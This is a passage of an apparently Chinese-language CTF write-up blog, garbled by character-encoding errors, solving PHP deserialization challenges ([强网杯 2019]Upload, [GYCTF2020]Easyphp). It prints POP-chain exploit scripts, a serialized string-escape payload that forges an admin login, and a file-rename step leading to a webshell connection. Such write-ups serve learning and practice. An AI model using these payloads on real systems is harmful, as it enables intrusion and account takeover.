class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;source = <span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;source-&gt;str-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="å¼ºç½‘æ¯-2019-Upload"><a href="#å¼ºç½‘æ¯-2019-Upload" class="headerlink" title="[å¼ºç½‘æ¯ 2019]Upload"></a>[å¼ºç½‘æ¯ 2019]Upload</h3><p>è¿™é“é¢˜æ‹–æ‹–æ‹‰æ‹‰å¥½å‡ å¤©äº†ï¼Œä»Šå¤©æ¥å†™ä¸€ä¸‹å§</p>
<p>æ³¨å†Œç™»å½•ï¼Œæœ‰ä¸ªä¸Šä¼ æ–‡ä»¶ï¼Œæ‰«äº†ä¸€ä¸‹ï¼Œå‘ç°äº†<a href="http://www.tar.tzï¼Œä¸‹è½½æ‰’ä¸‹æºç ï¼Œæœ‰å¾ˆå¤šæ–‡ä»¶ï¼Œçœ‹äº†freebufä¸Šçš„wpï¼Œåœ¨application/web/controller/Register.phpå’Œapplication/web/controller/Index.phpä¸¤ä¸ªæ–‡ä»¶ä¸­å­˜åœ¨ç€å¯åˆ©ç”¨ç‚¹ï¼Œä¸‹é¢å°±æ˜¯æ¥åšä»£ç å®¡è®¡äº†ï¼Œå°±æ˜¯å› ä¸ºæ°´å¹³ä¸å¤Ÿï¼Œä¸æ˜¯ä¸ºäº†åšé¢˜è€Œåšé¢˜ï¼Œä¸ºäº†ç†æ¸…æ€è·¯ä¸‰å¤©æ–­æ–­ç»­ç»­èŠ±äº†ä¿©å°æ—¶ï¼Œè¿˜æ˜¯å¾ˆæœ‰æ”¶è·çš„" target="_blank" rel="noopener">www.tar.tzï¼Œä¸‹è½½æ‰’ä¸‹æºç ï¼Œæœ‰å¾ˆå¤šæ–‡ä»¶ï¼Œçœ‹äº†freebufä¸Šçš„wpï¼Œåœ¨application/web/controller/Register.phpå’Œapplication/web/controller/Index.phpä¸¤ä¸ªæ–‡ä»¶ä¸­å­˜åœ¨ç€å¯åˆ©ç”¨ç‚¹ï¼Œä¸‹é¢å°±æ˜¯æ¥åšä»£ç å®¡è®¡äº†ï¼Œå°±æ˜¯å› ä¸ºæ°´å¹³ä¸å¤Ÿï¼Œä¸æ˜¯ä¸ºäº†åšé¢˜è€Œåšé¢˜ï¼Œä¸ºäº†ç†æ¸…æ€è·¯ä¸‰å¤©æ–­æ–­ç»­ç»­èŠ±äº†ä¿©å°æ—¶ï¼Œè¿˜æ˜¯å¾ˆæœ‰æ”¶è·çš„</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>register.phpä¸­æœ‰ä¸€ä¸ªææ„å‡½æ•°ï¼Œè¿™é‡Œè¦è®©registed=0å°±èƒ½å¤Ÿè°ƒç”¨index()æ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>profileä¸­æœ‰ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ï¼Œè°ƒç”¨ä¸å¯è®¿é—®å¯¹è±¡æ—¶ä¼šè§¦å‘__getï¼Œè°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶ä¼šè§¦å‘__callé­”æœ¯æ–¹æ³•ï¼Œè¿™æ ·é€šè¿‡ä¸Šé¢çš„ææ„æ–¹æ³•ï¼Œè®©checkerç­‰äºProfileç±»å°±èƒ½å¤Ÿè§¦å‘__callé­”æœ¯æ–¹æ³•ï¼Œç„¶åè¿›å…¥å‡½æ•°ä¼šè§¦å‘$this-&gt;indexï¼Œè°ƒç”¨ä¸å­˜åœ¨çš„å¯¹è±¡    ï¼Œè§¦å‘__getï¼Œè¿”å›$this-&gt;except[â€˜indexâ€™]ï¼Œæ­¤æ—¶å°†exceptèµ‹å€¼ä¸ºæ•°ç»„è°ƒç”¨upload_imgå‡½æ•°ï¼Œå°±å¯ä»¥è¿›è¡Œæ–‡ä»¶çš„å¤åˆ¶ã€é‡å‘½å</p>
<p>pop</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Register-&gt;__destruct</span><br><span class="line">Profile-&gt; __call</span><br><span class="line">Profile-&gt; __get</span><br><span class="line">Profile-&gt; upload_img()</span><br></pre></td></tr></table></figure>

<p>é™„ä¸Šè‡ªå·±çš„è„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp=<span class="string">"../public/upload/adeee0c170ad4ffb110df0cde294aecd/0094fbc2d7c3eb5bdfd1254e438b0c83.png"</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"../public/upload/adeee0c170ad4ffb110df0cde294aecd/0094fbc2d7c3eb5bdfd1254e438b0c83.php"</span>;<span class="comment">//è¿™é‡Œçš„è·¯å¾„æ¥è‡ªæºç ä¸­ï¼Œè‡ªå·±æ‰¾æ‰¾èƒ½çœ‹åˆ°</span></span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except=<span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Register();</span><br><span class="line">$a-&gt;checker = <span class="keyword">new</span> Profile();</span><br><span class="line">$a-&gt;checker-&gt;checker=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2020/05/30/unserialize/1.png" class="">

<p>æˆåŠŸæ”¹äº†æ–‡ä»¶åï¼Œèšå‰‘è¿æ¥ï¼Œæ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag</p>
<h3 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h3><img src="/2020/05/30/unserialize/2.png" class="">

<p>ç™»å½•ç•Œé¢ï¼Œå°è¯•äº†ä¸€ä¸‹ä¸‡èƒ½å¯†é’¥ï¼Œä¸Šä¸å»</p>
<p>æ‰«æä¸€ä¸‹ç›®å½•ç»“æ„ï¼Œå‘ç°æœ‰<a href="http://www.zip,ä¸‹è½½å¾—åˆ°æºç ï¼Œåˆ†æ" target="_blank" rel="noopener">www.zip,ä¸‹è½½å¾—åˆ°æºç ï¼Œåˆ†æ</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//update.php</span></span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">'login'</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"ä½ è¿˜æ²¡æœ‰ç™»é™†å‘¢ï¼"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åªè¦èƒ½å¤ŸæˆåŠŸç™»å½•ï¼Œå°±èƒ½æ‹¿åˆ°flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//login.php</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i"</span>, $_POST[<span class="string">'username'</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"&lt;br&gt;Damn you, hacker!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">"/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i"</span>, $_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"Damn you, hacker!"</span>);</span><br></pre></td></tr></table></figure>

<p>ç™»å½•ç•Œé¢å¯¹å¸¸è§çš„sqlæ³¨å…¥è¯éƒ½è¿›è¡Œäº†è¿‡æ»¤</p>
<p>é‡ç‚¹éƒ¨åˆ†åœ¨lib.phpä¸­ï¼Œè¿™é‡Œå†™äº†4ä¸ªç±»ï¼Œåº”è¯¥æ˜¯åºåˆ—åŒ–äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">"127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">"test"</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">'username'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">'password'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$_SESSION[<span class="string">'token'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:"</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">'s'</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'ç”¨æˆ·ä¸å­˜åœ¨!'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'å¯†ç é”™è¯¯ï¼'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">'token'</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//è¿˜æ²¡æ¥å¾—åŠå†™</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„åˆ°dbCtrlç±»ä¸­ï¼Œloginå‡½æ•°ä¸­</p>
<ul>
<li>tokençš„å€¼ä¸ºadminå¯ä»¥é€šè¿‡éªŒè¯</li>
<li>passwordçš„MD5å€¼ç­‰äºæ•°æ®åº“ä¸­çš„åªä¹Ÿå¯ç™»å½•æˆåŠŸ</li>
</ul>
<p>è¿™é‡Œçš„SQLæŸ¥è¯¢è¯­å¥åº”è¯¥æ˜¯</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">"<span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">User</span> <span class="keyword">where</span> username=?<span class="string">"</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($newInfo,$sql)</span></span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯¥ç±»ä¸­ææ„å‡½æ•°ä¼šè¾“å‡ºsqlè¯­å¥ï¼Œä¹Ÿå°±æ˜¯åœ¨é”€æ¯ç±»æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ï¼Œæ³¨æ„åˆ°Userç±»ä¸­æœ‰__toString()é­”æœ¯æ–¹æ³•ï¼Œè¿™é‡Œå¯ä»¥èµ‹å€¼sqlä¸ºUserç±»</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">        $mysqli=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=$mysqli-&gt;login(<span class="string">'select id,password from user where username=?'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;id)&#123;</span><br><span class="line">        $_SESSION[<span class="string">'id'</span>]=<span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        $_SESSION[<span class="string">'login'</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ä½ çš„IDæ˜¯"</span>.$_SESSION[<span class="string">'id'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ä½ å¥½ï¼"</span>.$_SESSION[<span class="string">'token'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./update.php'&lt;/script&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">'id'</span>],$Info,<span class="string">"update user SET age=$age,nickname=$nickname where id="</span>.$_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">        <span class="comment">//è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">'age'</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">'nickname'</span>];</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname);<span class="comment">//å±</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"0-0"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨__toString()é­”æœ¯æ–¹æ³•ä¹‹åï¼Œä¼šè°ƒç”¨updateæ–¹æ³•ï¼Œå¹¶ä¸”å‚æ•°å€¼ä¸ºageï¼Œnicknameä¸ºInfoç±»ï¼Œå°±ä¼šè°ƒç”¨__call()é­”æœ¯æ–¹æ³•ï¼Œå¹¶ä¸”ä»¥ageä¸ºå‚æ•°å€¼ </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age,$nickname)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$argument)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$CtrlCase</code>è°ƒç”¨äº†<code>login()</code>æ–¹æ³•ï¼Œå‚æ•°æ˜¯<code>User.age</code>çš„å€¼ä¼ è¿›æ¥çš„ï¼Œè¿™æ ·åªéœ€è¦å°†è¿™ä¸ªç±»é‡Œçš„<code>$CtrlCase</code>å˜é‡å®ä¾‹åŒ–ä¸º<code>dbCtrl</code>ç±»çš„å¯¹è±¡ï¼Œè¿™æ ·å°±ç›¸å½“äºè°ƒç”¨äº†<code>dbCtrl::login($sql)</code>ï¼Œè€Œä¸”å‚æ•°sqlè¯­å¥ä¹Ÿå¯ä»¥æ§åˆ¶,æœ€ååªç”¨æ›´æ”¹ä¸€ä¸‹dbCtrlç±»ä¸­çš„å‚æ•°å€¼å³å¯</p>
<p>pocï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sql = <span class="keyword">new</span> User();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;CtrlCase = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="string">'select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname = <span class="keyword">new</span> Info();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">"admin"</span>;</span><br><span class="line">    <span class="keyword">public</span> $password = <span class="string">"1"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> UpdateHelper();</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:12:"UpdateHelper":1:&#123;s:3:"sql";O:4:"User":2:&#123;s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":1:&#123;s:8:"CtrlCase";O:6:"dbCtrl":2:&#123;s:4:"name";s:5:"admin";s:8:"password";s:1:"1";&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>åˆ°è¿™é‡Œè¿˜æ²¡æœ‰ç»“æŸï¼Œæ³¨æ„åˆ°ä¼ å…¥çš„ageå’Œnicknameå€¼ä¼šç»è¿‡safeå‡½æ•°çš„è¿‡æ»¤ï¼Œæ¥çœ‹ä¸€ä¸‹safeå‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($parm)</span></span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">'union'</span>,<span class="string">'regexp'</span>,<span class="string">'load'</span>,<span class="string">'into'</span>,<span class="string">'flag'</span>,<span class="string">'file'</span>,<span class="string">'insert'</span>,<span class="string">"'"</span>,<span class="string">'\\'</span>,<span class="string">"*"</span>,<span class="string">"alter"</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">'hacker'</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥è¯´æ˜¯å¾ˆç†Ÿæ‚‰çš„ä¸œè¥¿äº†ï¼Œå­—ç¬¦ä¸²é€ƒé€¸ï¼Œåªè¦å­˜åœ¨æ•°ç»„ä¸­çš„å€¼å…¨éƒ¨æ›¿æ¢æˆhackerï¼Œè¿™å°±å¯ä»¥è®©åºåˆ—åŒ–çš„æ•°æ®é€ƒé€¸ï¼Œå…·ä½“å¯ä»¥å»çœ‹buuä¸Šçš„ä¸€é“piapiapia</p>
<p>final pocï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion<span class="string">";s:8:"</span>CtrlCase<span class="string">";O:12:"</span>UpdateHelper<span class="string">":1:&#123;s:3:"</span>sql<span class="string">";O:4:"</span>User<span class="string">":2:&#123;s:3:"</span>age<span class="string">";s:70:"</span>select <span class="number">1</span>,<span class="string">"c4ca4238a0b923820dcc509a6f75849b"</span> from user where username=?<span class="string">";s:8:"</span>nickname<span class="string">";O:4:"</span>Info<span class="string">":1:&#123;s:8:"</span>CtrlCase<span class="string">";O:6:"</span>dbCtrl<span class="string">":2:&#123;s:4:"</span>name<span class="string">";s:5:"</span>admin<span class="string">";s:8:"</span>password<span class="string">";s:1:"</span><span class="number">1</span><span class="string">";&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>æœ€ååœ¨update.phpé¡µé¢postä¼ å€¼,ç™»å½•ç•Œé¢ä»¥adminå’Œ1ç™»å½•ï¼Œå°±èƒ½ç›´æ¥çœ‹åˆ°flagäº†</p>
<img src="/2020/05/30/unserialize/3.png" class="">

<h3 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h3><p>æœŸæœ«è€ƒè¯•å¤ä¹ ï¼Œä¸­é—´å·®ä¸å¤š20å¤šå¤©æ²¡åšè¿‡é¢˜äº†ï¼Œç‰¹åˆ«æ˜¯åºåˆ—åŒ–çš„é¢˜ï¼Œç”Ÿç–äº†ï¼Œèµ¶ç´§æ¥ç»ƒç»ƒæ‰¾æ‰¾æ„Ÿè§‰</p>
